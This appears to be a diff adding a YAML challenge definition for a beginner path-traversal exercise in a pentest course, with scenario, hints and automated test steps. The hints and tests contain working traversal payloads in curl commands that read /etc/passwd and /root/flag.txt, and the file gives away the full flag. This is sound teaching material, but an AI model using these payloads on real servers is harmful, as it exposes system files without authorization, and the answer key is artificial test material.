@@ -1,0 +1,89 @@
+name: "Pinnacle Cloud - Directory Traversal"
+description: "Pinnacle Cloud Services has a file download feature with insufficient input validation. Exploit path traversal to read files outside the web root and extract assessment tokens."
+
+difficulty: beginner
+category: web
+duration_minutes: 35
+randomize_ip_offsets: true
+visibility: course
+week: 4
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/04_Directory_Traversal/"
+flag: "OCR{p4th_tr4v3rs3d}"
+
+objectives:
+  - Identify a file download feature vulnerable to path traversal
+  - Craft directory traversal payloads using ../ sequences
+  - Read system files outside the web application root
+  - Understand the impact of insufficient path validation
+  - Capture the flag
+
+scenario: |
+  Pinnacle Cloud Services runs a customer documentation portal where clients
+  can download product guides, API references, and release notes. The portal
+  was built quickly by a junior developer and went live without a security
+  review.
+
+  Marcus Reed (Engineering Manager) authorized the assessment: "The portal is
+  simple - just serves static files. I can't imagine there's much risk there.
+  But our compliance team wants a sign-off before the SOC 2 audit."
+
+  The documentation portal is at http://<target>. Two assessment tokens have
+  been placed on the server - one in the application directory and one that
+  requires full filesystem traversal to reach.
+
+credentials: []
+
+hints:
+  - text: |
+      Browse the documentation portal and look at how file downloads work.
+      Check the URL structure when downloading a document. Is the filename
+      passed as a parameter? What happens if you modify it?
+    unlock_after_minutes: 8
+  - text: |
+      The download endpoint uses a "file" parameter like /download?file=guide.pdf.
+      Try replacing the filename with a traversal sequence: /download?file=../../../etc/passwd
+      If you can read /etc/passwd, you have path traversal. Now look for the tokens.
+    unlock_after_minutes: 16
+  - text: |
+      Token 1: /download?file=../config/token.conf
+      Token 2: /download?file=../../../root/flag.txt
+      Assemble: OCR{token1_token2}
+    unlock_after_minutes: 22
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "Doc Portal"
+      type: "server"
+      ip_offset: "16"
+      ports: [80]
+      services: ["Flask"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "Web application responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/"
+      expect: "200"
+
+    - name: "Path traversal reads /etc/passwd"
+      command: "curl -s 'http://{target.webapp}/download?file=../../../etc/passwd' | grep -c root"
+      expect: "1"
+
+    - name: "Extract token 1 from application config"
+      command: "curl -s 'http://{target.webapp}/download?file=../config/token.conf' | grep -o 'token=[a-z0-9_]*' | sed 's/token=//'"
+      expect: "p4th"
+
+    - name: "Extract token 2 from /root/flag.txt"
+      command: "curl -s 'http://{target.webapp}/download?file=../../../root/flag.txt'"
+      expect: "tr4v3rs3d"
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{p4th_tr4v3rs3d}'"
+      expect: "OCR{p4th_tr4v3rs3d}"
